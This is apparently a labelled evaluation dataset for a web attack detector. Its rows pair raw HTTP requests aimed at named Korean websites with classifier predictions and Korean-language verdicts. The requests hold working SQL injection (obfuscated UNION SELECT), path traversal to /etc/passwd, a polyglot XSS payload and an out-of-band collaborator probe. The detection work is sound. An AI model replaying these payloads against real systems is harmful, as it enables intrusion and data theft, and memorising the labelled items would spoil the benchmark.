Unnamed: 0,payload,label,code,CVE,cluster,pred,correct,result
17750,"GET /enu/ATR/SI_ENG_prayerList.jsp?areaCode=+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+%2f**%2f%2f**%2fcAsT(0x393631353738343330312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330332e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330342e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330352e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330362e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330372e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330382e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330392e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031302e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031332e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031342e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031352e39+as+char)&sigunguCode=&code3=&gender=&gotoPage=& HTTP/1.1\r\nAccept: Text/Html,Application/Xhtml Xml,Application/Xml;Q=0.9,*/*;Q=0.8\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Rv:50.0) Gecko/20100101 Firefox/50.0\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip\r\nCookie: JSESSIONID_GLB=F6aZqFI7Jp9rMpYiGD6Jb1eTqAxeda0ZL09PFGRwp79a5pqSJVFrKgTacTS71VdI.amV1c19kb21haW4vdmlzaXRrb3JlYTFfMg==\r\nHost: english.visitkorea.or.kr",1,SI,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : or 1=1 /**/uNiOn/**/AlL /**/sElEcT /**/cAsT(0x393631353738343330312e39 as char), /**/cAsT(0x393631353738343330322e39 as char), /**/cAsT(0x393631353738343330332e39 as char), /**/cAsT(0x393631353738343330342e39 as char), /**/cAsT(0x393631353738343330352e39 as char), /**/cAsT(0x393631353738343330362e39 as char), /**/cAsT(0x393631353738343330372e39 as char), /**/cAsT(0x393631353738343330382e39 as char), /**/cAsT(0x393631353738343330392e39 as char), /**/cAsT(0x39363135373834333031302e39 as char), /**/cAsT(0x39363135373834333031312e39 as char), /**/cAsT(0x39363135373834333031322e39 as char), /**/cAsT(0x39363135373834333031332e39 as char), /**/cAsT(0x39363135373834333031342e39 as char), /**/cAsT(0x39363135373834333031352e39 as char)
공격 유형 : SQL Injection"
44972,"GET /service/?tm=board&sm=...%2f...%2f%2f...%2f...%2f%2f...%2f...%2f%2f...%2f...%2f%2f...%2f...%2f%2f...%2f...%2f%2f...%2f...%2f%2f...%2f...%2f%2fetc%2fpasswd&ac=lst HTTP/1.1"" 200 11564 ""https://dais.karts.ac.kr/service/?tm=about&sm=site"" ""Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36 NetHelper70""210.211.1.199 - - [12/Apr/2022:10:26:28 +0900] ""GET /service/?tm=board&sm=lzocdtt9xi1d20goc2nmfekjaag343xrpfg27qw.burpcollaborator.net HTTP/1.1"" 200 11542 ""https://dais.ka",1,PT,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : ...%2f...%2f%2f...%2f...%2f%2f...%2f...%2f%2f...%2f...%2f%2f...%2f...%2f%2f...%2f...%2f%2f...%2f...%2f%2f...%2f...%2f%2fetc%2fpasswd
공격 유형 : Directory Traversal (파일 경로 조작)"
124408,"POST /login_process/login HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Content-Type: application/x-www-form-urlencoded
Content-Length: 586
Origin: http://www.mall.shop
Connection: keep-alive
Referer: http://www.mall.shop/member/login?return_url=/main
Cookie: shopReferer=; marketplace=direct; mobileapp=N; today_view=a%3A1%3A%7Bi%3A0%3Bi%3A38%3B%7D
Upgrade-Insecure-Requests: 1

return_url=%2Fmain&order_auth=0&userid=%23jaVasCript%3A%2F*-%2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F%28%2F*+*%2FoNcliCk%3Dalert%285397%29+%29%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--%21%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert%285397%29%2F%2F%3E%5Cx3e&password=%23jaVasCript%3A%2F*-%2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F%28%2F*+*%2FoNcliCk%3Dalert%285397%29+%29%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--%21%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert%285397%29%2F%2F%3E%5Cx3e&idsave=checked",1,XSS,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : userid=%23jaVasCript%3A%2F*-%2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F%28%2F*+*%2FoNcliCk%3Dalert%285397%29+%29%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--%21%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert%285397%29%2F%2F%3E%5Cx3e&password=%23jaVasCript%3A%2F*-%2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F%28%2F*+*%2FoNcliCk%3Dalert%285397%29+%29%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--%21%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert%285397%29%2F%2F%3E%5Cx3e
공격 유형 : Cross-Site Scripting (XSS)"
46102,"GET /intro/intro_06.jsp?to_period=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc HTTP/1.1Host: koreatta.sports.or.krAccept-Charset: iso-8859-1,utf-8;q=0.9,*;q=0.1Accept-Language: enConnection: Keep-AliveCookie: JSESSIONID=0B2352DD756EEF0543F01008043DA371User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)Pragma: no-cacheAccept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, image/png, */*",1,PT,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : to_period=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc
공격 유형 : Directory Traversal"
20907,"GET /board/photo.asp?page=999999.9+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+%2f**%2f%2f**%2fcAsT(0x393631353738343330312e39+as+char)-- HTTP/1.1\r\nAccept: Text/Html,Application/Xhtml Xml,Application/Xml;Q=0.9,*/*;Q=0.8\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Rv:50.0) Gecko/20100101 Firefox/50.0\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip\r\nHost: youth.koreanpc.kr",1,SI,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : uNiOn/AlL sElEcT cAsT(0x393631353738343330312e39 as char)--
공격 유형 : SQL Injection"
47832,"GET /pacsone/nocache.php?path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2f.%2fzpx%2f..%2fpasswd HTTP/1.1
Host: www.kcisa.kr
User-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1866.237 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip",1,PT,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : path=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2f.%2fzpx%2f..%2fpasswd
공격 유형 : Path Traversal"
24587,"GET /enu/ATR/ENG_localList.jsp?gotoPage=1+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+%2f**%2f%2f**%2fcAsT(0x393631353738343330312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330332e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330342e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330352e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330362e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330372e39+as+char) HTTP/1.1\r\nAccept: Text/Html,Application/Xhtml Xml,Application/Xml;Q=0.9,*/*;Q=0.8\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Rv:50.0) Gecko/20100101 Firefox/50.0\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip\r\nCookie: __smVisitorID=DPaPs7WIELn; JSESSIONID=agJZfqJvUgDCV32bV6EehOneJ6vwVZqeWny6vXbCsX1cdAHXJISadEwSSJvJXOEX\r\nHost: english1.visitkorea.or.kr",1,SI,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : 1 or 1=1 /**/uNiOn/**/AlL /**/sElEcT /**/cAsT(0x393631353738343330312e39 as char), /**/cAsT(0x393631353738343330322e39 as char), /**/cAsT(0x393631353738343330332e39 as char), /**/cAsT(0x393631353738343330342e39 as char), /**/cAsT(0x393631353738343330352e39 as char), /**/cAsT(0x3936313537...
공격 유형 : SQL Injection"
124419,"GET /stats/search_auto_complete?keyword=%23jaVasCript%3A%2F*-%2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F(%2F*+*%2FoNcliCk%3Dalert(5397)+)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert(5397)%2F%2F%3E%5Cx3e HTTP/1.1
Host: www.mall.shop
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
X-Requested-With: XMLHttpRequest
Connection: keep-alive
Referer: http://www.mall.shop/member/login?return_url=/mypage/coupon
Cookie: mobileapp=N; shopReferer=; marketplace=direct; mobileapp=N; today_view=a%3A1%3A%7Bi%3A0%3Bi%3A38%3B%7D
Content-Length: 0",1,XSS,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : %23jaVasCript%3A%2F*-%2F*%60%2F*%5C%60%2F*%27%2F*%22%2F**%2F(%2F*+*%2FoNcliCk%3Dalert(5397)+)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%5Cx3csVg%2F%3CsVg%2FoNloAd%3Dalert(5397)%2F%2F%3E%5Cx3e
공격 유형 : Cross-Site Scripting (XSS)"
12621,"GET /ktv_contents.jsp?cid=492126+or+1%27%3d%271%27+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+%2f**%2f%2f**%2fcAsT(0x393631353738343330312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330332e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330342e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330352e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330362e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330372e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330382e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330392e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031302e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031332e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031342e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031352e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031362e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031372e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031382e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031392e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333032302e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333032312e39+as+char)+and+%271%27%3d%271 HTTP/1.1\r\nAccept: Text/Html,Application/Xhtml Xml,Application/Xml;Q=0.9,*",1,SI,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : cid=492126+or+1%27%3d%271%27+%2f**%2f%2f**%2f%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+%2f**%2f%2f**%2fcAsT(0x393631353738343330312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330332e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x393631353738343330342e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x393631353738343330352e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x393631353738343330362e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x393631353738343330372e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x393631353738343330382e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x393631353738343330392e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x39363135373834333031302e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x39363135373834333031312e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x39363135373834333031322e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x39363135373834333031332e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x39363135373834333031342e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x39363135373834333031352e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x39363135373834333031362e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x39363135373834333031372e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x39363135373834333031382e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x39363135373834333031392e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x39363135373834333032302e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x39363135373834333032312e39+as+char)+and+%271%27%3d%271
공격 유형 : SQL Injection"
30765,"GET /enu/ATR/ENG_localList.jsp?gotoPage=1+or+1%27%3d%271%27+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+%2f**%2f%2f**%2fcAsT(0x393631353738343330312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330332e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330342e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330352e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330362e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330372e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330382e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330392e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031302e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031332e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031342e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031352e39+as+char)+and+%271%27%3d%271 HTTP/1.1\r\nAccept: Text/Html,Application/Xhtml Xml,Application/Xml;Q=0.9,*/*;Q=0.8\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Rv:50.0) Gecko/20100101 Firefox/50.0\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip\r\nCookie: __smVisitorID=DPaPs7WIELn; JSESSIONID=agJZfqJvUgDCV32bV6EehOneJ6vwVZqeWny6vXbCsX1cdAHXJISadEwSSJvJXOEX\r\nHost: english1.visitkorea.or.kr",1,SI,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : gotoPage=1+or+1%27%3d%271%27+%2f**%2f%2f**%2f%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+%2f**%2f%2f**%2fcAsT(0x393631353738343330312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330332e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330342e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330352e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330362e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330372e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330382e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330392e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031302e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031332e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031342e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031352e39+as+char)+and+%271%27%3d%271
공격 유형 : SQL Injection"
31224,"GET /ktv_contents.jsp?cid=999999.9+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+%2f**%2f%2f**%2fcAsT(0x393631353738343330312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330332e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330342e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330352e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330362e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330372e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330382e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330392e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031302e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031332e39+as+char)-- HTTP/1.1\r\nAccept: Text/Html,Application/Xhtml Xml,Application/Xml;Q=0.9,*/*;Q=0.8\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Rv:50.0) Gecko/20100101 Firefox/50.0\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip\r\nCookie: WMONID=j9ttiW6ufc2; JSESSIONID=aaaeSuuHxxhTsclHc60IxX7pOhkpL4PhR4VrxZgT2_-iQFc3WicUu52vevR2\r\nHost: www.ktv.go.kr",1,SI,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : /ktv_contents.jsp?cid=999999.9+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+%2f**%2f%2f**%2fcAsT(0x393631353738343330312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330332e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x393631353738343330342e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x393631353738343330352e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x393631353738343330362e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x393631353738343330372e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x393631353738343330382e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x393631353738343330392e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x39363135373834333031302e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x39363135373834333031312e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x39363135373834333031322e39+as+char)%2c%2f**%2f%2f%2fcAsT(0x39363135373834333031332e39+as+char)--
공격 유형 : SQL Injection"
19983,"GET /enu/ATR/ENG_localList.jsp?gotoPage=1+or+1%3d1+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+%2f**%2f%2f**%2fcAsT(0x393631353738343330312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330332e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330342e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330352e39+as+char) HTTP/1.1\r\nAccept: Text/Html,Application/Xhtml Xml,Application/Xml;Q=0.9,*/*;Q=0.8\r\nConnection: keep-alive\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Rv:50.0) Gecko/20100101 Firefox/50.0\r\nAccept-Language: en-us,en;q=0.5\r\nAccept-Encoding: gzip\r\nCookie: __smVisitorID=DPaPs7WIELn; JSESSIONID=agJZfqJvUgDCV32bV6EehOneJ6vwVZqeWny6vXbCsX1cdAHXJISadEwSSJvJXOEX\r\nHost: english1.visitkorea.or.kr",1,SI,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : 1 or 1=1 /**/union/**/all /**/select /**/cast(0x393631353738343330312e39 as char), /**/cast(0x393631353738343330322e39 as char), /**/cast(0x393631353738343330332e39 as char), /**/cast(0x393631353738343330342e39 as char), /**/cast(0x393631353738343330352e39 as char)
공격 유형 : SQL Injection"
21440,GET /enu/ATR/ENG_localList.jsp?gotoPage=1+or+1%27%3d%271%27+%2f**%2f%2f**%2fuNiOn%2f**%2fAlL+%2f**%2f%2f**%2fsElEcT+%2f**%2f%2f**%2fcAsT(0x393631353738343330312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330332e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330342e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330352e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330362e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330372e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330382e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x393631353738343330392e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031302e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031322e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031332e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031342e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031352e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031362e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031372e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031382e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333031392e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333032302e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333032312e39+as+char)%2c%2f**%2f%2f**%2fcAsT(0x39363135373834333032322e39+as+char)+and+%271%27%3d%271 HTT,1,SI,,31,1,True,"공격 여부(0:비공격, 1:공격) : 1
공격 구문 : or 1'='1' /**//uNiOn/**/AlL /**//sElEcT /**/cAsT(0x393631353738343330312e39 as char), /**//cAsT(0x393631353738343330322e39 as char), /**//cAsT(0x393631353738343330332e39 as char), /**//cAsT(0x393631353738343330342e39 as char), /**//cAsT(0x393631353738343330352e39 as char), /**//cAsT(0x393631353738343330362e39 as char), /**//cAsT(0x393631353738343330372e39 as char), /**//cAsT(0x393631353738343330382e39 as char), /**//cAsT(0x393631353738343330392e39 as char), /**//cAsT(0x39363135373834333031302e39 as char), /**//cAsT(0x39363135373834333031312e39 as char), /**//cAsT(0x39363135373834333031322e39 as char), /**//cAsT(0x39363135373834333031332e39 as char), /**//cAsT(0x39363135373834333031342e39 as char), /**//cAsT(0x39363135373834333031352e39 as char), /**//cAsT(0x39363135373834333031362e39 as char), /**//cAsT(0x39363135373834333031372e39 as char), /**//cAsT(0x39363135373834333031382e39 as char), /**//cAsT(0x39363135373834333031392e39 as char), /**//cAsT(0x39363135373834333032302e39 as char), /**//cAsT(0x39363135373834333032312e39 as char), /**//cAsT(0x39363135373834333032322e39 as char) and '1'='1
공격 유형 : SQL Injection"
